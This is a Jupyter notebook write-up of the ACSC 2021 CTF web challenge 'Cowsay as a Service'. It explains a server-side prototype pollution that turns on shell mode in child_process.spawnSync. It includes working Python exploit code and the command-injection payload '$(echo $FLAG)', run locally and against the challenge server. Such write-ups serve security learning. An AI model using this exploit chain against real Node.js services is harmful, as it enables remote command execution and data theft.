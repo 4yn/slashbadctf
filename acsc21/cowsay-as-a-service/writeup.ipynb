{
 "cells": [
  {
   "cell_type": "markdown",
   "source": [
    "# Cowsay as a Service\n",
    "\n",
    "> WEB | 370 | 33 Solves\n",
    "> \n",
    "> Enjoy your cowsay life with our Cowsay as a Service!  \n",
    "> You can spawn your private instance from https://cowsay-as-a-service.chal.acsc.asia/.  \n",
    ">\n",
    "> Notice: Please do not spawn too many instances since our server resource is limited.  \n",
    "> You can check the source code and run it in your local machine before do that.  \n",
    "> Each instances are alive only for 5 minutes.  \n",
    "> But don't worry! You can spawn again even if your instance expired.  \n",
    "> \n",
    "> https://cowsay-as-a-service.chal.acsc.asia/\n",
    "> \n",
    "> Attachment: cowsay-as-a-service.tar.gz (md5 b1f19fe170867369eb5297d2b9d4cc29)"
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "- We can run a local copy of the server, accessible at `localhost:3000`\n",
    "```bash\n",
    "$ tar -xvf ./challenge/cowsay-as-a-service.tar.gz\n",
    "$ cd distfiles\n",
    "$ npm install\n",
    "$ FLAG=FAKEFLAG node ./src/index.js\n",
    "```"
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "- On interacting with the server, the web service allows:\n",
    "  - Login with some username\n",
    "  - Requesting a cowsay ascii art\n",
    "  - Changing a \"color\" setting"
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "- Inspect source code in `src/index.js`\n",
    "- Username is read straight from cookies without sanitisation\n",
    "```js\n",
    "app.use(async (ctx, next) => {\n",
    "  ctx.state.user = ctx.cookies.get('username');\n",
    "  await next();\n",
    "});\n",
    "```\n",
    "- Cowsay is called using `child_process.spawnSync`\n",
    "```js\n",
    "router.get('/cowsay', (ctx, next) => {\n",
    "  // ...\n",
    "  if (ctx.request.query.say) {\n",
    "    const result = child_process.spawnSync('/usr/games/cowsay', [ctx.request.query.say], { timeout: 500 });\n",
    "    cowsay = result.stdout.toString();\n",
    "  }\n",
    "  // ...\n",
    "}\n",
    "```\n",
    "- And the \"settings\" is saved using a javascript object\n",
    "  - The `:name` key is read from the URL without sanitisation\n",
    "  - The `ctx.request.body.value` is also first processed with `bodyParser`, meaning a JSON request MIME will be read as JSON instead of as raw string\n",
    "```js\n",
    "router.post('/setting/:name', (ctx, next) => {\n",
    "  if (!settings[ctx.state.user]) {\n",
    "    settings[ctx.state.user] = {};\n",
    "  }\n",
    "  const setting = settings[ctx.state.user];\n",
    "  setting[ctx.params.name] = ctx.request.body.value;\n",
    "}\n",
    "app.use(bodyParser());\n",
    "```\n",
    "- Because we control `ctx.state.user`, `:name` and `ctx.request.body.value`, we have write control over the settings object\n",
    "- This is a potential server side prototype pollution vulnerability"
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "- Read [`child_process.spawnSync` docs](https://nodejs.org/api/child_process.html#child_process_child_process_spawnsync_command_args_options)\n",
    "- In the server code, an options object with `timeout` key is passed\n",
    "- There is another option `shell` that if set will enable shell interpolation in the args sent\n",
    "```\n",
    "options <Object>:\n",
    "shell <boolean> | <string> If true, runs command inside of a shell. Uses '/bin/sh' on Unix, and process.env.ComSpec on Windows. A different shell can be specified as a string. See Shell requirements and Default Windows shell. Default: false (no shell).\n",
    "```\n",
    "- Our goal now is to cause prototype pollution such that `shell` is set to `true`"
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "source": [
    "import requests\n",
    "\n",
    "url = \"http://localhost:3000/\"\n",
    "\n",
    "# Helper query methods\n",
    "\n",
    "def sanity():\n",
    "  res = requests.get(url)\n",
    "  assert(res.status_code == 200)\n",
    "\n",
    "def cowsay(a, b, show=False):\n",
    "  res = requests.get(url + 'cowsay',\n",
    "    params={ 'say' : b },\n",
    "    cookies={ 'username' : a }\n",
    "  )\n",
    "  if show:\n",
    "    print(res.text[411:])\n",
    "\n",
    "def settings(a, b, x):\n",
    "  if isinstance(x, str):\n",
    "    res = requests.post(url + 'setting/' + b,\n",
    "      data={'value': x},\n",
    "      cookies={ 'username' : a }\n",
    "    )\n",
    "  else:\n",
    "    res = requests.post(url + 'setting/' + b,\n",
    "      json={'value': x},\n",
    "      cookies={ 'username' : a }\n",
    "    )\n",
    "  assert(res.status_code == 200)"
   ],
   "outputs": [],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "source": [
    "sanity()\n",
    "cowsay('a', 'b', show=True)"
   ],
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "<h1>Cowsay as a Service</h1>\n",
      "\n",
      "<details class=\"color-setting\">\n",
      "  <summary>Color Preferences</summary>\n",
      "  <form action=\"/setting/color\" method=\"POST\">\n",
      "    <input type=\"color\" name=\"value\" value=\"#000000\">\n",
      "    <input type=\"submit\" value=\"Change Color\">\n",
      "  </form>\n",
      "</details>\n",
      "\n",
      "<form action=\"/cowsay\" method=\"GET\" class=\"form\">\n",
      "  <input type=\"text\" name=\"say\" placeholder=\"hello\">\n",
      "  <input type=\"submit\" value=\"Say\">\n",
      "</form>\n",
      "\n",
      "<pre style=\"color: #000000\" class=\"cowsay\">\n",
      " ___\n",
      "< b >\n",
      " ---\n",
      "        \\   ^__^\n",
      "         \\  (oo)\\_______\n",
      "            (__)\\       )\\/\\\n",
      "                ||----w |\n",
      "                ||     ||\n",
      "\n",
      "</pre>\n",
      "\n"
     ]
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "- With a username `__proto__`, setting `shell` and a JSON encoded POST body of `true`, we can cause the protoype pollution:\n",
    "```js\n",
    "settings[\"__proto__\"] = {};\n",
    "settings[\"__proto__\"][\"shell\"] = true\n",
    "```"
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "source": [
    "settings('__proto__', 'shell', True)"
   ],
   "outputs": [],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "- Now we try to cowsay with shell interpolation to print environment variables"
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "source": [
    "cowsay('a', '$(echo $FLAG)', show=True)"
   ],
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "<h1>Cowsay as a Service</h1>\n",
      "\n",
      "<details class=\"color-setting\">\n",
      "  <summary>Color Preferences</summary>\n",
      "  <form action=\"/setting/color\" method=\"POST\">\n",
      "    <input type=\"color\" name=\"value\" value=\"#000000\">\n",
      "    <input type=\"submit\" value=\"Change Color\">\n",
      "  </form>\n",
      "</details>\n",
      "\n",
      "<form action=\"/cowsay\" method=\"GET\" class=\"form\">\n",
      "  <input type=\"text\" name=\"say\" placeholder=\"hello\">\n",
      "  <input type=\"submit\" value=\"Say\">\n",
      "</form>\n",
      "\n",
      "<pre style=\"color: #000000\" class=\"cowsay\">\n",
      " __________\n",
      "< FAKEFLAG >\n",
      " ----------\n",
      "        \\   ^__^\n",
      "         \\  (oo)\\_______\n",
      "            (__)\\       )\\/\\\n",
      "                ||----w |\n",
      "                ||     ||\n",
      "\n",
      "</pre>\n",
      "\n"
     ]
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "- Repeat on live server!"
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "source": [
    "url = \"http://<redacted>:<redacted>@cowsay-nodes.chal.acsc.asia:62948/\"\n",
    "sanity()\n",
    "cowsay('a', 'b')\n",
    "settings('__proto__', 'shell', True)\n",
    "res = cowsay('a', '$(echo $FLAG)', show=True)"
   ],
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "<h1>Cowsay as a Service</h1>\n",
      "\n",
      "<details class=\"color-setting\">\n",
      "  <summary>Color Preferences</summary>\n",
      "  <form action=\"/setting/color\" method=\"POST\">\n",
      "    <input type=\"color\" name=\"value\" value=\"#000000\">\n",
      "    <input type=\"submit\" value=\"Change Color\">\n",
      "  </form>\n",
      "</details>\n",
      "\n",
      "<form action=\"/cowsay\" method=\"GET\" class=\"form\">\n",
      "  <input type=\"text\" name=\"say\" placeholder=\"hello\">\n",
      "  <input type=\"submit\" value=\"Say\">\n",
      "</form>\n",
      "\n",
      "<pre style=\"color: #000000\" class=\"cowsay\">\n",
      " __________________________________\n",
      "< ACSC{(oo)<Moooooooo_B09DRWWCSX!} >\n",
      " ----------------------------------\n",
      "        \\   ^__^\n",
      "         \\  (oo)\\_______\n",
      "            (__)\\       )\\/\\\n",
      "                ||----w |\n",
      "                ||     ||\n",
      "\n",
      "</pre>\n",
      "\n"
     ]
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "Flag: `ACSC{(oo)<Moooooooo_B09DRWWCSX!}`"
   ],
   "metadata": {}
  }
 ],
 "metadata": {
  "orig_nbformat": 4,
  "language_info": {
   "name": "python",
   "version": "3.9.2",
   "mimetype": "text/x-python",
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "pygments_lexer": "ipython3",
   "nbconvert_exporter": "python",
   "file_extension": ".py"
  },
  "kernelspec": {
   "name": "python3",
   "display_name": "Python 3.9.2 64-bit ('base': conda)"
  },
  "interpreter": {
   "hash": "ba4985b013d52bd6424c48022e2eb894d697d177d60817c6fcc2819191fa581a"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}